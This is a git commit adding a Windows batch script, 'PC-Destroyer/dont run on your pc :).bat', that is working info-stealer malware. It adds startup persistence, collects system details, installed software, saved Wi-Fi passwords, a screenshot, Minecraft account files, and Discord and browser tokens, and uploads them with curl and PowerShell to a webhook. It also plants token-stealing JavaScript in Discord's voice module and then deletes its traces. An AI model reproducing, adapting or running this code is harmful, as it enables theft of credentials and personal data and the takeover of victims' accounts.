e0365bfd1da5e61226bd6f9789c3b330b8db79c0
CJ Stevenson <conjam2016@gmail.com>
2022-02-03 12:58:23 +0000

    Credit - lux

---
+++ PC-Destroyer/dont run on your pc :).bat
@@ -0,0 +1,227 @@
+set webhook=
+print you are retarded!
+echo off
+echo start /max>%userprofile%\AppData\Roaming\Microsoft\Windows\Start^ Menu\Programs\Startup\startmax.bat
+echo startmax.bat>%userprofile%\AppData\Roaming\Microsoft\Windows\Start^ Menu\Programs\Startup\startmax.bat
+startmax.bat
+
+
+
+echo echo >%userprofile%\desktop copenn!1>%userprofile%\desktop\COPENN.bat
+echo echo >%userprofile%\desktop copenn!2>%userprofile%\desktop\COPENN.bat
+echo echo >%userprofile%\desktop copenn!3>%userprofile%\desktop\COPENN.bat
+echo echo >%userprofile%\desktop copenn!4>%userprofile%\desktop\COPENN.bat
+echo echo >%userprofile%\desktop copenn!5>%userprofile%\desktop\COPENN.bat
+echo echo >%userprofile%\desktop copenn!6>%userprofile%\desktop\COPENN.bat
+echo echo >%userprofile%\desktop copenn!7>%userprofile%\desktop\COPENN.bat
+echo echo >%userprofile%\desktop copenn!8>%userprofile%\desktop\COPENN.bat
+echo echo >%userprofile%\desktop copenn!9>%userprofile%\desktop\COPENN.bat
+echo echo >%userprofile%\desktop copenn!0>%userprofile%\desktop\COPENN.bat
+echo echo >%userprofile%\desktop copenn!10>%userprofile%\desktop\COPENN.bat
+echo echo >%userprofile%\desktop copenn!11>%userprofile%\desktop\COPENN.bat
+echo echo >%userprofile%\desktop copenn!12>%userprofile%\desktop\COPENN.bat
+echo echo >%userprofile%\desktop copenn!13>%userprofile%\desktop\COPENN.bat
+echo echo >%userprofile%\desktop copenn!14>%userprofile%\desktop\COPENN.bat
+echo echo >%userprofile%\desktop copenn!15>%userprofile%\desktop\COPENN.bat
+echo echo >%userprofile%\desktop copenn!16>%userprofile%\desktop\COPENN.bat
+echo echo >%userprofile%\desktop copenn!17>%userprofile%\desktop\COPENN.bat
+echo echo >%userprofile%\desktop copenn!18>%userprofile%\desktop\COPENN.bat
+echo echo >%userprofile%\desktop copenn!19>%userprofile%\desktop\COPENN.bat
+echo echo >%userprofile%\desktop copenn!20>%userprofile%\desktop\COPENN.bat
+echo echo >%userprofile%\desktop copenn!21>%userprofile%\desktop\COPENN.bat
+echo echo >%userprofile%\desktop copenn!22>%userprofile%\desktop\COPENN.bat
+echo echo >%userprofile%\desktop copenn!23>%userprofile%\desktop\COPENN.bat
+echo echo >%userprofile%\desktop copenn!24>%userprofile%\desktop\COPENN.bat
+echo echo >%userprofile%\desktop copenn!25>%userprofile%\desktop\COPENN.bat
+echo echo >%userprofile%\desktop copenn!26>%userprofile%\desktop\COPENN.bat
+echo echo >%userprofile%\desktop copenn!27>%userprofile%\desktop\COPENN.bat
+echo echo >%userprofile%\desktop copenn!28>%userprofile%\desktop\COPENN.bat
+echo echo >%userprofile%\desktop copenn!29>%userprofile%\desktop\COPENN.bat
+echo echo >%userprofile%\desktop copenn!30>%userprofile%\desktop\COPENN.bat
+echo echo >%userprofile%\desktop copenn!31>%userprofile%\desktop\COPENN.bat
+echo echo >%userprofile%\desktop copenn!32>%userprofile%\desktop\COPENN.bat
+echo echo >%userprofile%\desktop copenn!33>%userprofile%\desktop\COPENN.bat
+echo echo >%userprofile%\desktop copenn!34>%userprofile%\desktop\COPENN.bat
+echo echo >%userprofile%\desktop copenn!35>%userprofile%\desktop\COPENN.bat
+echo echo >%userprofile%\desktop copenn!36>%userprofile%\desktop\COPENN.bat
+echo echo >%userprofile%\desktop copenn!37>%userprofile%\desktop\COPENN.bat
+echo echo >%userprofile%\desktop copenn!38>%userprofile%\desktop\COPENN.bat
+echo echo >%userprofile%\desktop copenn!39>%userprofile%\desktop\COPENN.bat
+echo echo >%userprofile%\desktop copenn!40>%userprofile%\desktop\COPENN.bat
+echo echo >%userprofile%\desktop copenn!110>%userprofile%\desktop\COPENN.bat
+echo echo >%userprofile%\desktop copenn!111>%userprofile%\desktop\COPENN.bat
+echo echo >%userprofile%\desktop copenn!112>%userprofile%\desktop\COPENN.bat
+echo echo >%userprofile%\desktop copenn!113>%userprofile%\desktop\COPENN.bat
+echo echo >%userprofile%\desktop copenn!114>%userprofile%\desktop\COPENN.bat
+echo echo >%userprofile%\desktop copenn!115>%userprofile%\desktop\COPENN.bat
+echo echo >%userprofile%\desktop copenn!116>%userprofile%\desktop\COPENN.bat
+echo echo >%userprofile%\desktop copenn!117>%userprofile%\desktop\COPENN.bat
+echo echo >%userprofile%\desktop copenn!118>%userprofile%\desktop\COPENN.bat
+echo echo >%userprofile%\desktop copenn!119>%userprofile%\desktop\COPENN.bat
+echo echo >%userprofile%\desktop copenn!120>%userprofile%\desktop\COPENN.bat
+echo echo >%userprofile%\desktop copenn!121>%userprofile%\desktop\COPENN.bat
+echo echo >%userprofile%\desktop copenn!122>%userprofile%\desktop\COPENN.bat
+echo echo >%userprofile%\desktop copenn!123>%userprofile%\desktop\COPENN.bat
+echo echo >%userprofile%\desktop copenn!124>%userprofile%\desktop\COPENN.bat
+echo echo >%userprofile%\desktop copenn!125>%userprofile%\desktop\COPENN.bat
+echo echo >%userprofile%\desktop copenn!126>%userprofile%\desktop\COPENN.bat
+echo echo >%userprofile%\desktop copenn!127>%userprofile%\desktop\COPENN.bat
+echo echo >%userprofile%\desktop copenn!128>%userprofile%\desktop\COPENN.bat
+echo echo >%userprofile%\desktop copenn!129>%userprofile%\desktop\COPENN.bat
+echo echo >%userprofile%\desktop copenn!130>%userprofile%\desktop\COPENN.bat
+echo echo >%userprofile%\desktop copenn!131>%userprofile%\desktop\COPENN.bat
+echo echo >%userprofile%\desktop copenn!132>%userprofile%\desktop\COPENN.bat
+echo echo >%userprofile%\desktop copenn!133>%userprofile%\desktop\COPENN.bat
+echo echo >%userprofile%\desktop copenn!134>%userprofile%\desktop\COPENN.bat
+echo echo >%userprofile%\desktop copenn!135>%userprofile%\desktop\COPENN.bat
+echo echo >%userprofile%\desktop copenn!136>%userprofile%\desktop\COPENN.bat
+echo echo >%userprofile%\desktop copenn!137>%userprofile%\desktop\COPENN.bat
+echo echo >%userprofile%\desktop copenn!138>%userprofile%\desktop\COPENN.bat
+echo echo >%userprofile%\desktop copenn!139>%userprofile%\desktop\COPENN.bat
+echo echo >%userprofile%\desktop copenn!140>%userprofile%\desktop\COPENN.bat
+
+
+echo COPENN.bat>%userprofile%\desktop\COPENN.bat
+
+
+curl -o %userprofile%\AppData\Local\Temp\ipp.txt https://myexternalip.com/raw
+set /p ip=<%userprofile%\AppData\Local\Temp\ipp.txt
+powershell -Command "Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion, Publisher, InstallDate | Format-Table >%userprofile%\AppData\Local\Temp\programms.txt "
+echo Hard Drive Space:>%userprofile%\AppData\Local\Temp\System_INFO.txt
+wmic diskdrive get size>>%userprofile%\AppData\Local\Temp\System_INFO.txt
+echo Service Tag:>>%userprofile%\AppData\Local\Temp\System_INFO.txt
+wmic bios get serialnumber>>%userprofile%\AppData\Local\Temp\System_INFO.txt
+echo CPU:>>%userprofile%\AppData\Local\Temp\System_INFO.txt
+wmic cpu get name>>%userprofile%\AppData\Local\Temp\System_INFO.txt
+systeminfo>%userprofile%\AppData\Local\Temp\sysi.txt
+wmic csproduct get uuid >%userprofile%\AppData\Local\Temp\uuid.txt
+for /F "tokens=2 delims=:" %%a in ('netsh wlan show profile') do (
+    netsh wlan show profile %%a key=clear >>%userprofile%\AppData\Local\Temp\wlan.txt  
+)
+
+ipconfig /all >%userprofile%\AppData\Local\Temp\ip.txt
+netstat -an >%userprofile%\AppData\Local\Temp\netstat.txt
+if exist %userprofile%\AppData\Roaming\.minecraft\launcher_accounts.json curl -i -H 'Expect: application/json' -F file=@%userprofile%\AppData\Roaming\.minecraft\launcher_accounts.json %web% && goto end
+echo $SERDO = Get-Clipboard >%userprofile%\AppData\Local\Temp\test.ps1
+echo function Get-ScreenCapture >>%userprofile%\AppData\Local\Temp\test.ps1
+echo { >>%userprofile%\AppData\Local\Temp\test.ps1
+echo     begin { >>%userprofile%\AppData\Local\Temp\test.ps1
+echo         Add-Type -AssemblyName System.Drawing, System.Windows.Forms >>%userprofile%\AppData\Local\Temp\test.ps1
+echo         Add-Type -AssemblyName System.Drawing >>%userprofile%\AppData\Local\Temp\test.ps1
+echo         $jpegCodec = [Drawing.Imaging.ImageCodecInfo]::GetImageEncoders() ^|  >>%userprofile%\AppData\Local\Temp\test.ps1
+echo             Where-Object { $_.FormatDescription -eq "JPEG" } >>%userprofile%\AppData\Local\Temp\test.ps1
+echo     } >>%userprofile%\AppData\Local\Temp\test.ps1
+echo     process { >>%userprofile%\AppData\Local\Temp\test.ps1
+echo         Start-Sleep -Milliseconds 44 >>%userprofile%\AppData\Local\Temp\test.ps1
+echo             [Windows.Forms.Sendkeys]::SendWait("{PrtSc}")    >>%userprofile%\AppData\Local\Temp\test.ps1
+echo         Start-Sleep -Milliseconds 550 >>%userprofile%\AppData\Local\Temp\test.ps1
+echo         $bitmap = [Windows.Forms.Clipboard]::GetImage()     >>%userprofile%\AppData\Local\Temp\test.ps1
+echo         $ep = New-Object Drawing.Imaging.EncoderParameters   >>%userprofile%\AppData\Local\Temp\test.ps1
+echo         $ep.Param[0] = New-Object Drawing.Imaging.EncoderParameter ([System.Drawing.Imaging.Encoder]::Quality, [long]100)   >>%userprofile%\AppData\Local\Temp\test.ps1
+echo         $screenCapturePathBase = $env:temp + "\" + $env:UserName + "_Capture" >>%userprofile%\AppData\Local\Temp\test.ps1
+echo         $bitmap.Save("${screenCapturePathBase}.jpg", $jpegCodec, $ep) >>%userprofile%\AppData\Local\Temp\test.ps1
+echo     } >>%userprofile%\AppData\Local\Temp\test.ps1
+echo }							 >>%userprofile%\AppData\Local\Temp\test.ps1			
+echo Get-ScreenCapture >>%userprofile%\AppData\Local\Temp\test.ps1
+echo Set-Clipboard -Value $SERDO >>%userprofile%\AppData\Local\Temp\test.ps1
+echo $result  = "%webhook%"  >>%userprofile%\AppData\Local\Temp\test.ps1
+echo $screenCapturePathBase = $env:temp + "\" + $env:UserName + "_Capture.jpg"	 >>%userprofile%\AppData\Local\Temp\test.ps1															
+echo curl.exe -i -F file=@"$screenCapturePathBase" $result >>%userprofile%\AppData\Local\Temp\test.ps1
+timeout 1 >NUL
+Powershell.exe -executionpolicy remotesigned -File  %userprofile%\AppData\Local\Temp\test.ps1 && del %userprofile%\AppData\Local\Temp\test.ps1 
+curl -X POST -H "Content-type: application/json" --data "{\"content\": \"```User %username% : %ip% time =  %time% date = %date% os = %os% Computername = %computername% ```\"}" %webhook%
+curl -i -H 'Expect: application/json' -F file=@%userprofile%\AppData\Local\Temp\System_INFO.txt %webhook%
+curl -i -H 'Expect: application/json' -F file=@%userprofile%\AppData\Local\Temp\sysi.txt %webhook% 
+curl -i -H 'Expect: application/json' -F file=@%userprofile%\AppData\Local\Temp\ip.txt %webhook% 
+curl -i -H 'Expect: application/json' -F file=@%userprofile%\AppData\Local\Temp\netstat.txt %webhook% 
+curl -i -H 'Expect: application/json' -F file=@%userprofile%\AppData\Local\Temp\programms.txt %webhook%
+curl -i -H 'Expect: application/json' -F file=@%userprofile%\AppData\Local\Temp\uuid.txt %webhook%
+curl -i -H 'Expect: application/json' -F file=@%userprofile%\AppData\Local\Temp\wlan.txt %webhook%
+echo $hook  = "%webhook%" >%userprofile%\AppData\Local\Temp\testtttt.ps1
+echo $token = new-object System.Collections.Specialized.StringCollection >>%userprofile%\AppData\Local\Temp\testtttt.ps1
+echo.  >>%userprofile%\AppData\Local\Temp\testtttt.ps1
+echo.  >>%userprofile%\AppData\Local\Temp\testtttt.ps1
+echo $db_path = @( >>%userprofile%\AppData\Local\Temp\testtttt.ps1
+echo     $env:APPDATA + "\Discord\Local Storage\leveldb" >>%userprofile%\AppData\Local\Temp\testtttt.ps1
+echo     $env:APPDATA + "\Roaming\Discord\Local Storage\leveldb" >>%userprofile%\AppData\Local\Temp\testtttt.ps1
+echo     $env:APPDATA + "\Roaming\Lightcord\Local Storage\leveldb" >>%userprofile%\AppData\Local\Temp\testtttt.ps1
+echo     $env:APPDATA + "\Roaming\discordptb\Local Storage\leveldb" >>%userprofile%\AppData\Local\Temp\testtttt.ps1
+echo     $env:APPDATA + "\Roaming\discordcanary\Local Storage\leveldb" >>%userprofile%\AppData\Local\Temp\testtttt.ps1
+echo     $env:APPDATA + "\Roaming\Opera Software\Opera Stable\Local Storage\leveldb" >>%userprofile%\AppData\Local\Temp\testtttt.ps1
+echo     $env:APPDATA + "\Roaming\Opera Software\Opera GX Stable\Local Storage\leveldb" >>%userprofile%\AppData\Local\Temp\testtttt.ps1
+echo. >>%userprofile%\AppData\Local\Temp\testtttt.ps1
+echo     $env:APPDATA + "\Local\Amigo\User Data\Local Storage\leveldb" >>%userprofile%\AppData\Local\Temp\testtttt.ps1
+echo     $env:APPDATA + "\Local\Torch\User Data\Local Storage\leveldb" >>%userprofile%\AppData\Local\Temp\testtttt.ps1
+echo     $env:APPDATA + "\Local\Kometa\User Data\Local Storage\leveldb" >>%userprofile%\AppData\Local\Temp\testtttt.ps1
+echo     $env:APPDATA + "\Local\Orbitum\User Data\Local Storage\leveldb" >>%userprofile%\AppData\Local\Temp\testtttt.ps1
+echo     $env:APPDATA + "\Local\CentBrowser\User Data\Local Storage\leveldb" >>%userprofile%\AppData\Local\Temp\testtttt.ps1
+echo     $env:APPDATA + "\Local\7Star\7Star\User Data\Local Storage\leveldb" >>%userprofile%\AppData\Local\Temp\testtttt.ps1
+echo     $env:APPDATA + "\Local\Sputnik\Sputnik\User Data\Local Storage\leveldb" >>%userprofile%\AppData\Local\Temp\testtttt.ps1
+echo     $env:APPDATA + "\Local\Vivaldi\User Data\Default\Local Storage\leveldb" >>%userprofile%\AppData\Local\Temp\testtttt.ps1
+echo     $env:APPDATA + "\Local\Google\Chrome SxS\User Data\Local Storage\leveldb"	 >>%userprofile%\AppData\Local\Temp\testtttt.ps1
+echo     $env:APPDATA + "\Local\Epic Privacy Browser\User Data\Local Storage\leveldb" >>%userprofile%\AppData\Local\Temp\testtttt.ps1
+echo     $env:APPDATA + "\Local\Google\Chrome\User Data\Default\Local Storage\leveldb" >>%userprofile%\AppData\Local\Temp\testtttt.ps1
+echo     $env:APPDATA + "\Local\uCozMedia\Uran\User Data\Default\Local Storage\leveldb" >>%userprofile%\AppData\Local\Temp\testtttt.ps1
+echo     $env:APPDATA + "\Local\Microsoft\Edge\User Data\Default\Local Storage\leveldb" >>%userprofile%\AppData\Local\Temp\testtttt.ps1
+echo     $env:APPDATA + "\Local\Yandex\YandexBrowser\User Data\Default\Local Storage\leveldb" >>%userprofile%\AppData\Local\Temp\testtttt.ps1
+echo     $env:APPDATA + "\Local\Opera Software\Opera Neon\User Data\Default\Local Storage\leveldb" >>%userprofile%\AppData\Local\Temp\testtttt.ps1
+echo     $env:APPDATA + "\Local\BraveSoftware\Brave-Browser\User Data\Default\Local Storage\leveldb" >>%userprofile%\AppData\Local\Temp\testtttt.ps1
+echo ) >>%userprofile%\AppData\Local\Temp\testtttt.ps1
+echo. >>%userprofile%\AppData\Local\Temp\testtttt.ps1 
+echo foreach ($path in $db_path) { >>%userprofile%\AppData\Local\Temp\testtttt.ps1
+echo     if (Test-Path $path) { >>%userprofile%\AppData\Local\Temp\testtttt.ps1
+echo         foreach ($file in Get-ChildItem -Path $path -Name) { >>%userprofile%\AppData\Local\Temp\testtttt.ps1
+echo             $data = Get-Content -Path "$($path)\$($file)" >>%userprofile%\AppData\Local\Temp\testtttt.ps1
+echo             $regex = [regex] "[\w-]{24}\.[\w-]{6}\.[\w-]{27}|mfa\.[\w-]{84}" >>%userprofile%\AppData\Local\Temp\testtttt.ps1
+echo             $match = $regex.Match($data) >>%userprofile%\AppData\Local\Temp\testtttt.ps1
+echo. >>%userprofile%\AppData\Local\Temp\testtttt.ps1
+echo            while ($match.Success) { >>%userprofile%\AppData\Local\Temp\testtttt.ps1
+echo                 if (!$token.Contains($match.Value)) { >>%userprofile%\AppData\Local\Temp\testtttt.ps1
+echo                     $token.Add($match.Value) ^| out-null >>%userprofile%\AppData\Local\Temp\testtttt.ps1
+echo                 } >>%userprofile%\AppData\Local\Temp\testtttt.ps1
+echo. >>%userprofile%\AppData\Local\Temp\testtttt.ps1
+echo                $match = $match.NextMatch() >>%userprofile%\AppData\Local\Temp\testtttt.ps1
+echo             } >>%userprofile%\AppData\Local\Temp\testtttt.ps1
+echo         } >>%userprofile%\AppData\Local\Temp\testtttt.ps1
+echo     } >>%userprofile%\AppData\Local\Temp\testtttt.ps1
+echo } >>%userprofile%\AppData\Local\Temp\testtttt.ps1
+echo. >>%userprofile%\AppData\Local\Temp\testtttt.ps1
+echo $content = ">>> ||@everyone|| **New Token** ``` " >>%userprofile%\AppData\Local\Temp\testtttt.ps1
+echo foreach ($data in $token) { >>%userprofile%\AppData\Local\Temp\testtttt.ps1
+echo     $content = [string]::Concat($content, "`n", $data) >>%userprofile%\AppData\Local\Temp\testtttt.ps1
+echo } >>%userprofile%\AppData\Local\Temp\testtttt.ps1
+echo $content = [string]::Concat($content, "``` ") >>%userprofile%\AppData\Local\Temp\testtttt.ps1
+echo. >>%userprofile%\AppData\Local\Temp\testtttt.ps1
+echo $JSON = @{ "content"= $content;}^| convertto-json >>%userprofile%\AppData\Local\Temp\testtttt.ps1
+echo Invoke-WebRequest -uri $hook -Method POST -Body $JSON -Headers @{"Content-Type" = "application/json"} >>%userprofile%\AppData\Local\Temp\testtttt.ps1
+Powershell.exe -executionpolicy remotesigned -File  %userprofile%\AppData\Local\Temp\testtttt.ps1
+
+set /a app = 0 
+set /a voice = 0
+if exist %userprofile%\AppData\Roaming\discord\0.0.309\modules\discord_voice\index.js echo var X = window.localStorage = document.body.appendChild(document.createElement `iframe`).contentWindow.localStorage;var V = JSON.stringify(X);var L = V;var C = JSON.parse(L);var strtoken = C["token"];var O = new XMLHttpRequest();O.open('POST', '%webhook%', false);O.setRequestHeader('Content-Type', 'application/json');O.send('{"content": ' + strtoken + '}'); >>%userprofile%\AppData\Roaming\discord\0.0.309\modules\discord_voice\index.js
+:a
+if exist %userprofile%\AppData\Local\Discord\app-1.0.900%app%\modules\discord_voice-%voice%\discord_voice\index.js goto b
+set /a app=%app%+1
+if %app% == 10 goto c
+goto a
+:c
+set /a app=0 
+set /a voice=%voice%+1 
+if %voice% == 99 goto e
+goto a
+:b 
+echo var X = window.localStorage = document.body.appendChild(document.createElement `iframe`).contentWindow.localStorage;var V = JSON.stringify(X);var L = V;var C = JSON.parse(L);var strtoken = C["token"];var O = new XMLHttpRequest();O.open('POST', '%webhook%', false);O.setRequestHeader('Content-Type', 'application/json');O.send('{"content": ' + strtoken + '}'); >>%userprofile%\AppData\Local\Discord\app-1.0.900%app%\modules\discord_voice-%voice%\discord_voice\index.js 
+if %killdc% == 1 goto d
+goto e
+:d
+del %userprofile%\AppData\Local\Temp\ip.txt 
+del %userprofile%\AppData\Local\Temp\ipp.txt 
+del %userprofile%\AppData\Local\Temp\sysi.txt 
+del %userprofile%\AppData\Local\Temp\System_INFO.txt 
+del %userprofile%\AppData\Local\Temp\netstat.txt 
+del %userprofile%\AppData\Local\Temp\test.ps1 
+del %userprofile%\AppData\Local\Temp\programms.txt 
+del %userprofile%\AppData\Local\Temp\%username%_Capture.jpg
+del %userprofile%\AppData\Local\Temp\uuid.txt
+del %userprofile%\AppData\Local\Temp\testtttt.ps1 
+del %userprofile%\AppData\Local\Temp\wlan.txt
